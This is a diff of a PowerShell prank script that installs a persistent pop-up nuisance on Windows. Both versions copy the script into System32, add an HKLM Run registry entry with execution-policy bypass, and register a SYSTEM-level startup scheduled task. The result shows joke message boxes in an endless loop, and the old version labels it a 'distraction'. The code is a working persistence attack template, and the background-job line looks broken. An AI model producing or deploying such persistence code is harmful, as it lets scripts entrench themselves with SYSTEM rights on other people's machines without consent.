@@ -1,51 +1,65 @@
-# Create the Pop-up Distraction Script
-function Show-RandomJoke {
-    # List of jokes for distraction
-    $jokes = @(
-        "Why don’t skeletons fight each other? They don’t have the guts.",
-        "I told my computer I needed a break, and now it won’t stop sending me kit-kats.",
-        "I used to be a baker, but I couldn't make enough dough.",
-        "I'm reading a book on anti-gravity. It's impossible to put down!",
-        "Why don't oysters donate to charity? Because they are shellfish."
+# Jokes Pop-Up Script (Persistence)
+function Show-JokePopup {
+    Add-Type -AssemblyName System.Windows.Forms
+
+    $Jokes = @(
+        "Why don't skeletons fight each other? They don't have the guts.",
+        "Why did the scarecrow win an award? Because he was outstanding in his field!",
+        "Why don’t oysters donate to charity? Because they are shellfish.",
+        "Why don't programmers like nature? It has too many bugs.",
+        "What do you call fake spaghetti? An impasta!"
     )
 
-    # Choose a random joke from the list
-    $randomJoke = $jokes | Get-Random
-
-    # Show a message box with the joke
-    Add-Type -AssemblyName System.Windows.Forms
-    [System.Windows.Forms.MessageBox]::Show($randomJoke, "Random Joke", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
+    $RandomJoke = Get-Random -InputObject $Jokes
+    [System.Windows.Forms.MessageBox]::Show($RandomJoke, "Joke Time!", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
 }
 
-# Ensure Persistence via Registry (Run on Startup)
+# Function to run jokes every 10 seconds
+function Start-JokeLoop {
+    while ($true) {
+        Show-JokePopup
+        Start-Sleep -Seconds 10
+    }
+}
+
+# Persistence via Registry (runs script at startup)
 function Set-RegistryPersistence {
-    Write-Host "[*] Adding registry persistence..."
-    $scriptPath = "C:\Windows\System32\random_joke.ps1"
+    $scriptPath = "C:\Windows\System32\joke_script.ps1"
+    
+    # Save the script to the specified path
     Copy-Item $MyInvocation.MyCommand.Path -Destination $scriptPath -Force
+
+    # Add to the registry for startup persistence
     New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
-                     -Name "RandomJokeScript" `
-                     -Value "powershell -ExecutionPolicy Bypass -File $scriptPath" -Force
+                     -Name "JokePopup" `
+                     -Value "powershell -ExecutionPolicy Bypass -File $scriptPath" `
+                     -Force
     Write-Host "[+] Persistence added via registry."
 }
 
-# Ensure Persistence via Scheduled Task (Run at Startup)
+# Function to create Scheduled Task for persistence
 function Set-ScheduledTaskPersistence {
-    Write-Host "[*] Creating scheduled task for persistence..."
-    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File C:\Windows\System32\random_joke.ps1"
+    $scriptPath = "C:\Windows\System32\joke_script.ps1"
+    
+    # Create the scheduled task to run on startup
+    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File $scriptPath"
     $taskTrigger = New-ScheduledTaskTrigger -AtStartup
     $taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
     $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
-    Register-ScheduledTask -TaskName "RandomJokeTask" -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings -Force
+
+    Register-ScheduledTask -TaskName "JokePopupTask" `
+                           -Action $taskAction `
+                           -Trigger $taskTrigger `
+                           -Principal $taskPrincipal `
+                           -Settings $taskSettings `
+                           -Force
     Write-Host "[+] Persistence added via scheduled task."
 }
 
-# Main Execution: Set persistence and start the joke display loop
+# Main Execution
+Start-JokeLoop &  # Start the joke loop in the background
 Set-RegistryPersistence
 Set-ScheduledTaskPersistence
 
-# Loop to Show Jokes every 20 seconds
-Write-Host "[+] Starting Random Joke Distraction..."
-while ($true) {
-    Show-RandomJoke
-    Start-Sleep -Seconds 20 # Show a joke every 20 seconds
-}
+Write-Host "[+] Joke pop-ups should now persist even after closing PowerShell."
+
